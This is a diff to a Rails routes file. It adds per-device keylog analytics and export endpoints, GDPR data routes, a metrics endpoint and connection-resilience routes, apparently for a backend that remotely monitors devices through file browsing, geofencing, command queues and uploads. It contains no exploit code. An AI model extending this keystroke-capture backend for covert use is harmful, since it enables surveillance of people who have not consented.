@@ -3,6 +3,10 @@ Rails.application.routes.draw do
   get '/health', to: 'health#index'
   get '/health/ready', to: 'health#ready'
   get '/health/live', to: 'health#live'
+  get '/health/startup', to: 'health#startup'
+
+  # Prometheus Metrics Endpoint
+  get '/metrics', to: 'metrics#index'
 
   # Audit Trail System
   resources :audit_logs, only: [:index, :show] do
@@ -114,6 +118,14 @@ Rails.application.routes.draw do
     post 'file_browser', to: 'file_browser#receive'
     post 'geofence', to: 'geofence#receive'
 
+    # Keylog Analytics API endpoints
+    scope 'devices/:id' do
+      get 'keylog_analytics', to: 'keylog_analytics#show'
+      get 'keylog_analytics/app_usage', to: 'keylog_analytics#app_usage'
+      get 'keylog_analytics/activity_timeline', to: 'keylog_analytics#activity_timeline'
+      get 'keylog_analytics/export', to: 'keylog_analytics#export'
+    end
+
     # Geofence Management
     scope 'devices/:device_id' do
       resources :geofences, controller: 'geofence', only: [:index, :create, :destroy]
@@ -136,11 +148,30 @@ Rails.application.routes.draw do
       end
     end
 
+    # GDPR Compliance Endpoints
+    scope 'devices/:id' do
+      post 'erasure_request', to: 'gdpr#erasure_request'
+      get 'data_export', to: 'gdpr#data_export'
+      get 'retention_policy', to: 'gdpr#show_retention_policy'
+      put 'retention_policy', to: 'gdpr#update_retention_policy'
+      get 'privacy_policy', to: 'gdpr#privacy_policy'
+    end
+
     namespace :v1 do
       get 'telemetry/devices', to: 'telemetry#devices'
       get 'telemetry/command_queue', to: 'telemetry#command_queue'
       get 'telemetry/webrtc_status', to: 'telemetry#webrtc_status'
       get 'telemetry/uploads', to: 'telemetry#uploads'
+
+      # Network Resilience endpoints
+      get 'connections', to: 'connections#index'
+      get 'connections/stats', to: 'connections#stats'
+      post 'connections/cleanup', to: 'connections#cleanup'
+      get 'circuit_breakers', to: 'circuit_breakers#index'
+      post 'circuit_breakers/:service/reset', to: 'circuit_breakers#reset'
+      get 'offline_queue/:device_id', to: 'offline_queue#show'
+      post 'offline_queue/:device_id', to: 'offline_queue#create'
+      delete 'offline_queue/:device_id', to: 'offline_queue#flush'
     end
   end
 
